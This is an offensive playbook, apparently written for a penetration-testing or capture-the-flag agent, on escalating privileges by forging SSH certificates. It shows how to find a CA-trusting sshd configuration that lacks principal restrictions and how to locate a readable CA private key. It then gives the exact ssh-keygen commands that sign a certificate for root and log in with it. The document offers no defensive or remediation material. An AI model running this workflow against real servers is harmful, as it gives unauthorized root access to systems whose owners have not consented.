# SSH CA Certificate Forgery (Privilege Escalation)

## When this applies

- SSH access obtained, target uses SSH Certificate Authority (CA) for authentication.
- Check: `grep -r "TrustedUserCAKeys" /etc/ssh/sshd_config*`
- Goal: forge an SSH cert signed by the CA and SSH in as any user (including root).

## Workflow

1. **Detect SSH CA config** — look for `TrustedUserCAKeys /path/to/ca.pub` in `sshd_config`. If present, the server trusts certificates signed by that CA key.
2. **Check for missing principal validation** — if `TrustedUserCAKeys` is set but there is NO `AuthorizedPrincipalsFile` and NO `AuthorizedPrincipalsCommand`, any principal in a signed certificate is accepted. This means a cert with `principal=root` will grant root access.
3. **Find the CA private key** — check file permissions on the CA key path: `ls -la /path/to/ca_key`. Look for readable keys via group membership (`id`, check if your user/group has read access). Also check backup directories, deployment scripts, config management directories.
4. **Forge certificate** — generate a new key pair and sign it with the CA key for the target user:
   ```bash
   ssh-keygen -t ed25519 -f /tmp/forged -N ""
   ssh-keygen -s /path/to/ca_key -I forged -n root -V +52w /tmp/forged.pub
   ssh -i /tmp/forged root@localhost
   ```
5. **Escalate to any user** — change `-n root` to any username. Without `AuthorizedPrincipalsFile`, all principals are accepted.

## Verifying success

- `ssh -i /tmp/forged root@localhost id` returns `uid=0(root)`.

## Common pitfalls

- If `AuthorizedPrincipalsFile` is configured, the principal in the cert must match an entry in that file for the target user — try common principals (`root`, `admin`, sysadmin usernames found in the file).
- CA keys may be in non-obvious places — check git repos, `/etc/ansible/`, deployment scripts, and CM tooling directories.

## Tools

- ssh-keygen
- ssh
